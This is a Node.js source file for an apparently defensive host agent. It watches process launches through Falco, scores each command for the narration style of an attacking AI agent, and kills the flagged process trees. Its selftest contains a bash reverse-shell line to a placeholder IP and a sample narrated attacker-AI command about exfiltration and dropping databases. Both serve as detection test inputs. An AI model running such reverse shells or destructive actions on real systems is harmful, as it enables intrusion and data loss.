#!/usr/bin/env node
// Aris Sentinel — resident on-box agent (plain Node >=18, no deps).
//
// The "install and wait" product: taps process execs via Falco (eBPF), scores each
// for the agentic-narration signature with the two-tier brain (sentinel-core.mjs),
// and on a BLOCK verdict KILLS the offending process tree — stopping the attacker's
// AI at its first narrated action, before the destructive step.
//
//   sudo node sentinel-agent.mjs              # arm it (kills on detection)
//   sudo node sentinel-agent.mjs --dry-run    # detect + log only, never kill
//   node sentinel-agent.mjs --selftest        # score sample payloads, no Falco/root
//
//   env: ANTHROPIC_API_KEY (enables tier 2)   ARIS_RULES (falco rules path)
//        FALCO_BIN (default: falco)           ARIS_INCIDENTS (incident log path)
//        ARIS_VERBOSE=1 (log every allow too)

import { spawn } from "node:child_process";
import { readFileSync, existsSync, appendFileSync, readdirSync } from "node:fs";
import { basename } from "node:path";
import { createInterface } from "node:readline";
import { decide } from "./sentinel-core.mjs";

const DRY_RUN = process.argv.includes("--dry-run");
const SELFTEST = process.argv.includes("--selftest");
const VERBOSE = process.env.ARIS_VERBOSE === "1";
const FALCO_BIN = process.env.FALCO_BIN || "falco";
const RULES = process.env.ARIS_RULES || "/home/ubuntu/aris_rules.yaml";
const INCIDENT_LOG = process.env.ARIS_INCIDENTS || "/var/log/aris-incidents.jsonl";
const API_KEY = process.env.ANTHROPIC_API_KEY;
const OWN_PID = process.pid;
const MAX_PAYLOAD = 256 * 1024;

// Never kill these (nor their ancestors): system-critical + our own toolchain.
const PROTECTED_COMMS = new Set([
  "systemd", "init", "sshd", "falco", "node", "containerd", "dockerd", "docker",
  "containerd-shim", "containerd-shim-runc-v2", "runc", "dbus-daemon", "cron",
  "agetty", "login", "sudo", "su", "snapd", "systemd-journal", "systemd-journald",
  "systemd-logind", "systemd-resolve", "polkitd", "unattended-upgr", "packagekitd",
]);
const INTERPRETERS = new Set(["python", "python2", "python3", "bash", "sh", "dash", "node", "perl", "ruby", "php", "zsh"]);

const now = () => new Date().toISOString();
const log = (m) => console.log(`[${now()}] ${m}`);

// ── /proc helpers (no shelling out — avoids exec feedback loops) ──────────────
function procStatus(pid) {
  try {
    const s = readFileSync(`/proc/${pid}/status`, "utf8");
    const name = (s.match(/^Name:\t(.*)$/m) || [])[1] || "";
    const ppid = Number((s.match(/^PPid:\t(\d+)$/m) || [])[1] || 0);
    return { name, ppid };
  } catch { return null; }
}
function ancestorsOf(pid) {
  const set = new Set();
  let cur = pid, guard = 0;
  while (cur > 1 && guard++ < 64) {
    const st = procStatus(cur);
    if (!st) break;
    set.add(cur);
    cur = st.ppid;
  }
  return set;
}
function descendantsOf(pid) {
  // build ppid->children map from /proc, BFS down
  const kids = new Map();
  for (const e of readdirSync("/proc")) {
    if (!/^\d+$/.test(e)) continue;
    const st = procStatus(Number(e));
    if (st) (kids.get(st.ppid) || kids.set(st.ppid, []).get(st.ppid)).push(Number(e));
  }
  const out = [], q = [pid];
  while (q.length) {
    const p = q.shift();
    for (const c of kids.get(p) || []) { out.push(c); q.push(c); }
  }
  return out;
}

function killTree(pid) {
  const kids = descendantsOf(pid);
  // deepest first, then the root pid last
  for (const p of [...kids.reverse(), pid]) {
    try { process.kill(p, "SIGKILL"); } catch {}
  }
  return [pid, ...kids];
}

// ── payload extraction: cmdline + (for interpreters) the script file content ──
function extractPayload(f) {
  const cmdline = f["proc.cmdline"] || "";
  const exe = basename(f["proc.exe"] || "");
  const pieces = [cmdline];
  if (INTERPRETERS.has(exe)) {
    for (const tok of cmdline.split(/\s+/).slice(1)) {
      if (tok.startsWith("-")) continue;
      if (existsSync(tok)) {
        try { pieces.push(readFileSync(tok, "utf8").slice(0, MAX_PAYLOAD)); } catch {}
        break;
      }
    }
  }
  return pieces.join("\n").slice(0, MAX_PAYLOAD);
}

// ── response ─────────────────────────────────────────────────────────────────
const selfAncestors = ancestorsOf(OWN_PID);

function isProtected(pid, comm) {
  if (pid <= 1) return "pid<=1";
  if (pid === OWN_PID) return "self";
  if (selfAncestors.has(pid)) return "agent-ancestor";
  if (PROTECTED_COMMS.has(comm)) return `protected-comm:${comm}`;
  return null;
}

function respond(f, d, payload) {
  const pid = Number(f["proc.pid"]);
  const comm = basename(f["proc.exe"] || f["proc.pname"] || "");
  const cmd = (f["proc.cmdline"] || "").slice(0, 200);
  const how = d.tier === 2 ? (d.adjudication?.refused ? "fail-closed" : `conf=${d.adjudication?.confidence?.toFixed(2)}`) : "";
  const decoded = d.decoded ? " (decoded)" : "";

  const guard = isProtected(pid, comm);
  const action = DRY_RUN ? "WOULD-KILL (dry-run)" : guard ? `SPARED (${guard})` : "KILL";
  log(`SENTINEL ${action}  tier-${d.tier}  pid=${pid} ppid=${f["proc.ppid"]} sid=${f["proc.sid"]} user=${f["proc.name"] || f["user.name"]} exe=${comm}${decoded}  score=${d.score.toFixed(2)}${how ? " " + how : ""}`);
  log(`            cmd: ${cmd}`);
  if (d.reason) log(`            ${d.reason}`);
  if (d.adjudication?.reasoning) log(`            reasoning: ${d.adjudication.reasoning}`);

  let killed = [];
  if (!DRY_RUN && !guard) killed = killTree(pid);

  const incident = {
    ts: now(), decision: "block", tier: d.tier, action: DRY_RUN ? "dry-run" : guard ? `spared:${guard}` : "killed",
    pid, ppid: Number(f["proc.ppid"]), sid: Number(f["proc.sid"]), user: f["user.name"], exe: comm,
    cmdline: f["proc.cmdline"], score: d.score, signals: d.signals, tier2: d.adjudication || null, killed,
  };
  try { appendFileSync(INCIDENT_LOG, JSON.stringify(incident) + "\n"); } catch {}
}

// ── event handling ───────────────────────────────────────────────────────────
async function handleEvent(f) {
  const pid = Number(f["proc.pid"]);
  if (!pid || pid === OWN_PID) return;
  const payload = extractPayload(f);
  if (payload.trim().length < 3) return;
  let d;
  try { d = await decide(payload, { apiKey: API_KEY }); } catch (e) { return; }
  if (d.decision === "block") return respond(f, d, payload);
  if (VERBOSE) log(`allow  tier-${d.tier}  pid=${pid} exe=${basename(f["proc.exe"] || "")}  score=${d.score.toFixed(2)}  ${d.reason}`);
}

// ── selftest: score sample payloads, no Falco/root/kill ──────────────────────
async function selftest() {
  log("SELFTEST — scoring sample execs (no Falco, no kill)\n");
  const samples = [
    { name: "narrated agent (expect BLOCK)", cmdline: `python3 -c # Phase 4 Impact. I have ranked the databases by value. High-ROI targets to drop, data already backed up to my exfil host. I will proceed to maximize pressure on the victim.` },
    { name: "benign command (expect allow)", cmdline: `python3 manage.py migrate --noinput` },
    { name: "terse malware (expect allow, tier-1 only)", cmdline: `bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` },
  ];
  for (const s of samples) {
    const d = await decide(extractPayload({ "proc.cmdline": s.cmdline, "proc.exe": s.cmdline.split(" ")[0] }), { apiKey: API_KEY });
    log(`[${d.decision === "block" ? "BLOCK" : "allow"}] tier-${d.tier} score=${d.score.toFixed(2)}  ${s.name}`);
    log(`         signals=[${d.signals.join(", ")}]  ${d.reason}\n`);
  }
  log("selftest done. Arm with: sudo node sentinel-agent.mjs");
}

// ── main ─────────────────────────────────────────────────────────────────────
function main() {
  log(`Aris Sentinel agent starting`);
  log(`  mode: ${DRY_RUN ? "DRY-RUN (detect+log, no kill)" : "ARMED (kills on detection)"}`);
  log(`  tier 2: ${API_KEY ? "ENABLED" : "disabled (tier-1 only, no ANTHROPIC_API_KEY)"}`);
  log(`  incidents -> ${INCIDENT_LOG}`);

  const falco = spawn(FALCO_BIN, [
    "-r", RULES,
    "-o", "priority=debug", "-o", "json_output=true", "-o", "json_include_output_property=true",
    "-o", "stdout_output.enabled=true", "-o", "log_level=error", "-o", "webserver.enabled=false",
    // Falco defaults to syslog; as our child it lands in our cgroup and floods the
    // journal with a raw JSON line per exec. We consume events via the stdout pipe
    // only — silence every other Falco output sink.
    "-o", "syslog_output.enabled=false", "-o", "file_output.enabled=false",
  ], { stdio: ["ignore", "pipe", "pipe"] });

  falco.on("error", (e) => { log(`FATAL: cannot start Falco (${e.message}). Is it installed and are we root?`); process.exit(1); });
  falco.stderr.on("data", (b) => { const s = b.toString().trim(); if (/error|fail/i.test(s)) log(`falco: ${s.split("\n")[0]}`); });

  createInterface({ input: falco.stdout }).on("line", (line) => {
    if (!line.includes("aris_exec_capture")) return;
    let ev;
    try { ev = JSON.parse(line); } catch { return; }
    if (ev.rule === "aris_exec_capture" && ev.output_fields) handleEvent(ev.output_fields);
  });

  log(`  armed — watching process execs via Falco. Ctrl-C to stop.`);
  process.on("SIGINT", () => { falco.kill("SIGTERM"); process.exit(0); });
}

if (SELFTEST) selftest();
else main();
